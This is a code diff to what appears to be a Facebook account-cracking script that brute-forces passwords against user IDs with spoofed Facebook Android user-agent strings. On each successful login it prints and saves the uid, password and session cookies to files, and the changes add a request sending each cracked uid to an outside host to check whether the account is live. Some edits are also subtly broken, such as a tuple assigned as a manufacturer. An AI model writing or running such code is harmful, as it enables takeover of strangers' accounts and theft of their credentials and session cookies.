@@ -43,10 +43,10 @@ def fex():
 	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
 	fbbv = str(random.randint(10000000, 66666666))
 	fbrv = str(random.randint(000000000,999999999))
-	density = random.choice(['2.625'])
-	width = random.choice(["1080"])
-	height = random.choice(["2322"])
-	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/zh_TW_#Hant;FBRV/{str(fbrv)};FBCR/arm64-v8a;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_I005DC;FBSV/5.1;FBCA/arm64-v8a:armeabi;]"
+	density = random.choice(['2.25'])
+	width = random.choice(["1600"])
+	height = random.choice(["2452"])
+	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_AU;FBRV/{str(fbrv)};FBCR/YES OPTUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-T835;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
 	return ua
 
 def sex():
@@ -74,22 +74,22 @@ def sex():
 	
 def baby():
 	MOBILE_VERSION = f"{random.randint(4, 12)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
-	MOBILE_MODEL = random.choice(["SM-T835"])
-	BUILD = random.choice(["QP1A.190711.020"])
+	MOBILE_MODEL = random.choice(["SM-T835","Moto"])
+	BUILD = random.choice(["QP1A.190711.020", "QP1A.244982.977"])
 	BUILD_VERSION = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
 	FBBV = str(random.randint(10000000, 66666666))
-	DENSITY = random.choice(['2.25'])
-	WIDTH = random.choice(["1600"])
-	HEIGHT = random.choice(["2452"])
+	DENSITY = random.choice(['2.25', "2.75"])
+	WIDTH = random.choice(["1600", "1080"])
+	HEIGHT = random.choice(["2452", "2130"])
 	FB_VERSION = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
 	FBLC = random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"])
 	FBRV = str(random.randint(000000000,999999999))
 	FBCR = random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp-T","Ufone","Azercell"])
-	FBMF = 'samsung'
-	FBBD = random.choice(['samsung'])
+	FBMF = 'samsung','Xiaomi'
+	FBBD = random.choice(['samsung','xiaomi'])
 	FBPN = random.choice(["com.facebook.orca"])
-	FBOP = random.choice(["1"])
-	FBCA = random.choice(["armeabi-v7a:armeabi;"])
+	FBOP = random.choice(["19"])
+	FBCA = random.choice(["armeabi-v7a:armeabi;","arm64-v8a:armeabi;"])
 	END = f"[FBAN/FB4A;FBAV/{FB_VERSION}/FBBV/{FBBV};FBDM/{{density={DENSITY},width={WIDTH},height={HEIGHT}}};FBLC/{FBLC};FBRV/{FBRV};FBCR/{FBCR};FBMF/{FBMF};FBBD/{FBBD};FBPN/{FBPN};FBDV/{MOBILE_MODEL};FBSV/{MOBILE_VERSION};FBOP/{FBOP};FBCA/{FBCA}]"
 	OMG = f"Dalvik/2.1.0 Linux; U; Android {MOBILE_VERSION}; {MOBILE_MODEL} Build/QP1A.{BUILD_VERSION})"+END
 	return OMG 
@@ -102,7 +102,7 @@ logo = f"""
     ██         ██    ██   ██ ██      ██   ██ 
      ██████    ██    ██████  ███████ ██   ██                                                                                  
 {A}─────────────────────────────────────────────────
-{A}|✔| OWNER   : CYBER \n{A}|✔| TOOL    : FILE/RANDOM\n{A}|✔| VERSION : 0.7\n{A}─────────────────────────────────────────────────"""
+{A}|✔| OWNER   : CYBER \n{A}|✔| TOOL    : FILE/RANDOM\n{A}|✔| VERSION : 0.8\n{A}─────────────────────────────────────────────────"""
 #________________ KEY ______________#
 os.system('clear');print(logo)
 attemps = 0
@@ -428,18 +428,14 @@ def __Randm_M1__(ids,passlist):
                         if 'session_key' in po:
                                 uid = po['uid']
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                print(f'\r\r\x1b[38;5;46m|CYBER-OK| {str(uid)} | {pas} ')
-                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                                open('/sdcard/CYBER-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                oks.append(str(uid))
-                                break
-                        elif 'www.facebook.com' in po['error']['message']: 
-                                uid = po['error']['error_data']['uid']
-                                print(f'\r\r{R}|CYBER-CP| {str(uid)} | {pas} ')
-                                open('/sdcard/CYBER-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                cps.append(str(uid))
-                                break
-                        else:continue
+                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
+                                if res == 'LIVE':
+                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
+                                if res == 'LOCK':
+                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
+                                elif 'www.facebook.com' in po['error']['message']:
+                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
+                                else:continue
                 loop+=1
         except:pass
 #──────────────{ RANDOM-METHOD-M2 }──────────────#
@@ -457,18 +453,14 @@ def __Randm_M2__(ids,passlist):
                         if 'session_key' in po:
                                 uid = po['uid']
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                print(f'\r\r\x1b[38;5;46m|CYBER-OK| {str(uid)} | {pas} ')
-                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                                open('/sdcard/CYBER-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                oks.append(str(uid))
-                                break
-                        elif 'www.facebook.com' in po['error']['message']: 
-                                uid = po['error']['error_data']['uid']
-                                print(f'\r\r{R}|CYBER-CP| {str(uid)} | {pas} ')
-                                open('/sdcard/CYBER-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                cps.append(str(uid))
-                                break
-                        else:continue
+                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
+                                if res == 'LIVE':
+                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
+                                if res == 'LOCK':
+                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
+                                elif 'www.facebook.com' in po['error']['message']:
+                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
+                                else:continue
                 loop+=1
         except:pass
 #──────────────{ RANDOM-METHOD-M3 }──────────────#
@@ -486,18 +478,14 @@ def __Randm_M3__(ids,passlist):
                         if 'session_key' in po:
                                 uid = po['uid']
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                print(f'\r\r\x1b[38;5;46m|CYBER-OK| {str(uid)} | {pas} ')
-                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                                open('/sdcard/CYBER-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                oks.append(str(uid))
-                                break
-                        elif 'www.facebook.com' in po['error']['message']: 
-                                uid = po['error']['error_data']['uid']
-                                print(f'\r\r{R}|CYBER-CP| {str(uid)} | {pas} ')
-                                open('/sdcard/CYBER-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                cps.append(str(uid))
-                                break
-                        else:continue
+                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
+                                if res == 'LIVE':
+                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
+                                if res == 'LOCK':
+                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
+                                elif 'www.facebook.com' in po['error']['message']:
+                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
+                                else:continue
                 loop+=1
         except:pass
 #──────────────{ RANDOM-METHOD-M4 }──────────────#
@@ -544,18 +532,14 @@ def __Randm_M5__(ids,passlist):
                         if 'session_key' in po:
                                 uid = po['uid']
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                print(f'\r\r\x1b[38;5;46m|CYBER-OK| {str(uid)} | {pas} ')
-                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                                open('/sdcard/CYBER-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                oks.append(str(uid))
-                                break
-                        elif 'www.facebook.com' in po['error']['message']: 
-                                uid = po['error']['error_data']['uid']
-                                print(f'\r\r{R}|CYBER-CP| {str(uid)} | {pas} ')
-                                open('/sdcard/CYBER-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                cps.append(str(uid))
-                                break
-                        else:continue
+                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
+                                if res == 'LIVE':
+                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
+                                if res == 'LOCK':
+                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
+                                elif 'www.facebook.com' in po['error']['message']:
+                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
+                                else:continue
                 loop+=1
         except:pass
 #──────────────{ END }──────────────#
